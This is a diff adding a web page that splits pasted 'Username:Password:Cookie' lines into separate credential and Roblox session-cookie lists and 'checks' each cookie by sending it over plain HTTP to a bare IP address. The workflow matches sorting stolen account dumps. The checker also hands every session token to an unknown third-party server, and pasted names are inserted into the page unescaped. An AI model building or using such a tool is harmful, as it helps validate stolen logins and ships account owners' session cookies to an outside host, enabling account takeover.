@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Accounts Separate</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <style>
+        body {
+            background: linear-gradient(135deg, #e3f2fd, #4fc3f7);
+            min-height: 100vh;
+            font-family: 'Inter', sans-serif;
+            overflow-x: hidden;
+        }
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 2.5rem;
+        }
+        .card {
+            background: rgba(255, 255, 255, 0.98);
+            border-radius: 1.5rem;
+            box-shadow: 0 6px 30px rgba(0, 0, 0, 0.1);
+            padding: 3rem;
+            backdrop-filter: blur(12px);
+            transform: translateY(0);
+            animation: float 4s ease-in-out infinite;
+        }
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        .button {
+            position: relative;
+            overflow: hidden;
+            transition: transform 0.3s, box-shadow 0.3s;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+        .button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15);
+        }
+        .button::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
+            transition: 0.5s;
+        }
+        .button:hover::after {
+            left: 100%;
+        }
+        .page {
+            display: none;
+            animation: slideIn 0.5s ease-in-out;
+        }
+        .page.active {
+            display: block;
+        }
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(20px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+        h1 {
+            background: linear-gradient(to right, #0288d1, #4fc3f7);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: textGlow 2s ease-in-out infinite;
+        }
+        @keyframes textGlow {
+            0%, 100% { text-shadow: 0 0 5px rgba(79, 195, 247, 0.5); }
+            50% { text-shadow: 0 0 15px rgba(79, 195, 247, 0.8); }
+        }
+        textarea {
+            resize: none;
+            transition: border-color 0.3s;
+        }
+        textarea:focus {
+            border-color: #0288d1;
+            box-shadow: 0 0 10px rgba(2, 136, 209, 0.3);
+        }
+        .output-box {
+            background: #f8fafc;
+            border-radius: 0.5rem;
+            padding: 1rem;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 1rem;
+        }
+        th, td {
+            padding: 0.75rem;
+            text-align: left;
+            border-bottom: 1px solid #e5e7eb;
+        }
+        th {
+            background: #f1f5f9;
+            font-weight: 600;
+            color: #1e3a8a;
+        }
+        .valid {
+            color: #15803d;
+            font-weight: 500;
+        }
+        .invalid {
+            color: #b91c1c;
+            font-weight: 500;
+        }
+        .pending {
+            color: #d97706;
+            font-weight: 500;
+        }
+        .summary {
+            margin-top: 1rem;
+            font-weight: 600;
+            color: #1e3a8a;
+        }
+        .status-checking {
+            color: #0288d1;
+            font-weight: 600;
+            margin-bottom: 1rem;
+        }
+        .status-complete {
+            color: #15803d;
+            font-weight: 600;
+            margin-bottom: 1rem;
+        }
+        #copyButtons {
+            display: none;
+        }
+        footer {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            font-size: 12px;
+            color: #333;
+        }
+        /* Toast Notification */
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            padding: 1rem 1.5rem;
+            border-radius: 0.5rem;
+            color: white;
+            font-weight: 500;
+            opacity: 0;
+            transform: translateY(20px);
+            transition: opacity 0.3s, transform 0.3s;
+            z-index: 1000;
+        }
+        .toast.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        .toast.success {
+            background: #22c55e;
+            box-shadow: 0 4px 15px rgba(34, 197, 94, 0.3);
+        }
+        .toast.error {
+            background: #ef4444;
+            box-shadow: 0 4px 15px rgba(239, 68, 68, 0.3);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <h1 class="text-4xl font-bold text-center mb-10">Roblox Accounts Separate</h1>
+            <div class="flex justify-center space-x-6 mb-10">
+                <button onclick="showPage('split')" class="button bg-blue-500 text-white px-8 py-3 rounded-full font-semibold">Split Accounts</button>
+                <button onclick="showPage('check')" class="button bg-blue-500 text-white px-8 py-3 rounded-full font-semibold">Check Cookies</button>
+                <button onclick="showPage('block')" class="button bg-blue-500 text-white px-8 py-3 rounded-full font-semibold">Block Account</button>
+            </div>
+
+            <div id="split" class="page">
+                <h2 class="text-2xl font-semibold text-blue-800 mb-4">Split Accounts</h2>
+                <div class="flex space-x-4 mb-4">
+                    <button onclick="pasteInput('inputData')" class="button bg-blue-600 text-white px-4 py-2 rounded-lg">Paste</button>
+                    <p class="text-gray-700 font-semibold mt-2">Lines: <span id="inputLines">0</span></p>
+                </div>
+                <textarea id="inputData" class="w-full p-4 border border-gray-300 rounded-lg mb-4" rows="6" placeholder="Enter data (Username:Password:Cookie)" oninput="processInput()"></textarea>
+                
+                <div class="flex space-x-6">
+                    <div class="w-1/2">
+                        <div class="flex justify-between items-center mb-2">
+                            <p class="text-gray-700 font-semibold">Username:Password (Lines: <span id="userPassLines">0</span>)</p>
+                            <button onclick="copyText('userPassOutput')" class="button bg-blue-600 text-white px-4 py-2 rounded-lg">Copy</button>
+                        </div>
+                        <div id="userPassOutput" class="output-box text-gray-700"></div>
+                    </div>
+                    <div class="w-1/2">
+                        <div class="flex justify-between items-center mb-2">
+                            <p class="text-gray-700 font-semibold">Cookies (Lines: <span id="cookieLines">0</span>)</p>
+                            <button onclick="copyText('cookieOutput')" class="button bg-blue-600 text-white px-4 py-2 rounded-lg">Copy</button>
+                        </div>
+                        <div id="cookieOutput" class="output-box text-gray-700"></div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="check" class="page">
+                <h2 class="text-2xl font-semibold text-blue-800 mb-4">Check Cookies</h2>
+                <div class="flex space-x-4 mb-4">
+                    <button onclick="pasteInput('checkInputData')" class="button bg-blue-600 text-white px-4 py-2 rounded-lg">Paste</button>
+                    <p class="text-gray-700 font-semibold mt-2">Lines: <span id="checkInputLines">0</span></p>
+                </div>
+                <textarea id="checkInputData" class="w-full p-4 border border-gray-300 rounded-lg mb-4" rows="6" placeholder="Enter data (Username:Password:Cookie or Cookie)" oninput="processCheckInput()"></textarea>
+                <div id="copyButtons" class="flex space-x-4 mb-4">
+                    <button onclick="copyValidAccounts()" class="button bg-green-500 text-white px-4 py-2 rounded-lg">Copy Account Working</button>
+                    <button onclick="copyInvalidAccounts()" class="button bg-red-500 text-white px-4 py-2 rounded-lg">Copy Account Not Working</button>
+                </div>
+                <p id="checkStatus" class="status-checking">Checking cookies...</p>
+                <p class="summary">Total: <span id="totalCount">0</span>, Valid: <span id="validCount">0</span>, Invalid: <span id="invalidCount">0</span></p>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Identifier</th>
+                            <th>Cookie Status</th>
+                        </tr>
+                    </thead>
+                    <tbody id="checkTableBody"></tbody>
+                </table>
+            </div>
+
+            <div id="block" class="page">
+                <h2 class="text-2xl font-semibold text-blue-800 mb-4">Block Account</h2>
+                <p class="text-gray-700 leading-relaxed">Protect your gaming experience by blocking Roblox accounts effortlessly.</p>
+            </div>
+        </div>
+    </div>
+    <footer>
+        Created by NopNopA, NopNop
+    </footer>
+    <script>
+        let accountData = [];
+
+        function showNotification(message, type = 'success') {
+            const toast = document.createElement('div');
+            toast.className = `toast ${type}`;
+            toast.setAttribute('role', 'alert');
+            toast.setAttribute('aria-live', 'assertive');
+            toast.textContent = message;
+            document.body.appendChild(toast);
+
+            setTimeout(() => {
+                toast.classList.add('show');
+            }, 100);
+
+            setTimeout(() => {
+                toast.classList.remove('show');
+                setTimeout(() => {
+                    toast.remove();
+                }, 300);
+            }, 3000);
+        }
+
+        function showPage(pageId) {
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+            document.getElementById(pageId).classList.add('active');
+            if (pageId === 'check') {
+                processCheckInput();
+            }
+        }
+
+        async function pasteInput(inputId) {
+            try {
+                const permission = await navigator.permissions.query({ name: 'clipboard-read' });
+                if (permission.state === 'denied') {
+                    showNotification('Clipboard read permission denied.', 'error');
+                    return;
+                }
+                const text = await navigator.clipboard.readText();
+                document.getElementById(inputId).value = text;
+                if (inputId === 'inputData') {
+                    processInput();
+                } else if (inputId === 'checkInputData') {
+                    processCheckInput();
+                }
+            } catch (err) {
+                console.error('Failed to paste:', err);
+                showNotification('Failed to paste from clipboard.', 'error');
+            }
+        }
+
+        async function copyText(elementId) {
+            const text = document.getElementById(elementId).textContent;
+            try {
+                const permission = await navigator.permissions.query({ name: 'clipboard-write' });
+                if (permission.state === 'denied') {
+                    showNotification('Clipboard write permission denied.', 'error');
+                    return;
+                }
+                await navigator.clipboard.writeText(text);
+                showNotification('Copied to clipboard!', 'success');
+            } catch (err) {
+                console.error('Failed to copy:', err);
+                showNotification('Failed to copy to clipboard.', 'error');
+            }
+        }
+
+        function processInput() {
+            const input = document.getElementById('inputData').value.trim();
+            const lines = input.split('\n').filter(line => line.trim() !== '');
+            document.getElementById('inputLines').textContent = lines.length;
+
+            let userPassOutput = [];
+            let cookieOutput = [];
+
+            lines.forEach(line => {
+                const parts = line.split(':');
+                if (parts.length >= 3) {
+                    const username = parts[0];
+                    const password = parts[1];
+                    const cookie = parts.slice(2).join(':');
+                    userPassOutput.push(`${username}:${password}`);
+                    cookieOutput.push(cookie);
+                }
+            });
+
+            document.getElementById('userPassOutput').textContent = userPassOutput.join('\n');
+            document.getElementById('cookieOutput').textContent = cookieOutput.join('\n');
+            document.getElementById('userPassLines').textContent = userPassOutput.length;
+            document.getElementById('cookieLines').textContent = cookieOutput.length;
+        }
+
+        async function checkCookie(cookie, retryOnce = true) {
+            try {
+                const response = await fetch('http://103.216.158.53:1112/cookie', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ cookie })
+                });
+                if (!response.ok) {
+                    throw new Error(`HTTP error: ${response.status}`);
+                }
+                const result = await response.json();
+                return result.valid;
+            } catch (error) {
+                console.error('Error from server:', error);
+                if (retryOnce) {
+                    return await checkCookie(cookie, false);
+                }
+                return false;
+            }
+        }
+
+        async function processCheckInput() {
+            const input = document.getElementById('checkInputData').value.trim();
+            const lines = input.split('\n').filter(line => line.trim() !== '');
+            document.getElementById('checkInputLines').textContent = lines.length;
+            document.getElementById('totalCount').textContent = lines.length;
+            document.getElementById('validCount').textContent = '0';
+            document.getElementById('invalidCount').textContent = '0';
+
+            const tableBody = document.getElementById('checkTableBody');
+            const checkStatus = document.getElementById('checkStatus');
+            const copyButtons = document.getElementById('copyButtons');
+            tableBody.innerHTML = '';
+            accountData = [];
+
+            copyButtons.style.display = 'none';
+            checkStatus.textContent = 'Checking cookies...';
+            checkStatus.className = 'status-checking';
+
+            lines.forEach((line, index) => {
+                const parts = line.split(':');
+                let identifier, cookie;
+
+                if (parts.length >= 3) {
+                    identifier = parts[0];
+                    cookie = parts.slice(2).join(':');
+                } else {
+                    identifier = `Cookie ${index + 1}`;
+                    cookie = line;
+                }
+
+                accountData.push({ line, identifier, cookie, status: 'Pending' });
+
+                const row = document.createElement('tr');
+                row.id = `row-${index}`;
+                row.innerHTML = `
+                    <td>${identifier}</td>
+                    <td class="pending">Pending</td>
+                `;
+                tableBody.appendChild(row);
+            });
+
+            let validCount = 0;
+            let invalidCount = 0;
+
+            for (let i = 0; i < accountData.length; i++) {
+                const { cookie } = accountData[i];
+                const isValid = await checkCookie(cookie);
+                accountData[i].status = isValid ? 'Valid' : 'Invalid';
+
+                const row = document.getElementById(`row-${i}`);
+                row.innerHTML = `
+                    <td>${accountData[i].identifier}</td>
+                    <td class="${isValid ? 'valid' : 'invalid'}">${isValid ? 'Valid' : 'Invalid'}</td>
+                `;
+
+                if (isValid) {
+                    validCount++;
+                } else {
+                    invalidCount++;
+                }
+
+                document.getElementById('validCount').textContent = validCount;
+                document.getElementById('invalidCount').textContent = invalidCount;
+            }
+
+            copyButtons.style.display = 'flex';
+            checkStatus.textContent = 'Check complete!';
+            checkStatus.className = 'status-complete';
+        }
+
+        async function copyValidAccounts() {
+            const validAccounts = accountData
+                .filter(account => account.status === 'Valid')
+                .map(account => account.line)
+                .join('\n');
+            try {
+                const permission = await navigator.permissions.query({ name: 'clipboard-write' });
+                if (permission.state === 'denied') {
+                    showNotification('Clipboard write permission denied.', 'error');
+                    return;
+                }
+                await navigator.clipboard.writeText(validAccounts);
+                showNotification('Copied valid accounts to clipboard!', 'success');
+            } catch (err) {
+                console.error('Failed to copy valid accounts:', err);
+                showNotification('Failed to copy valid accounts.', 'error');
+            }
+        }
+
+        async function copyInvalidAccounts() {
+            const invalidAccounts = accountData
+                .filter(account => account.status === 'Invalid')
+                .map(account => account.line)
+                .join('\n');
+            try {
+                const permission = await navigator.permissions.query({ name: 'clipboard-write' });
+                if (permission.state === 'denied') {
+                    showNotification('Clipboard write permission denied.', 'error');
+                    return;
+                }
+                await navigator.clipboard.writeText(invalidAccounts);
+                showNotification('Copied invalid accounts to clipboard!', 'success');
+            } catch (err) {
+                console.error('Failed to copy invalid accounts:', err);
+                showNotification('Failed to copy invalid accounts.', 'error');
+            }
+        }
+    </script>
+</body>
+</html>
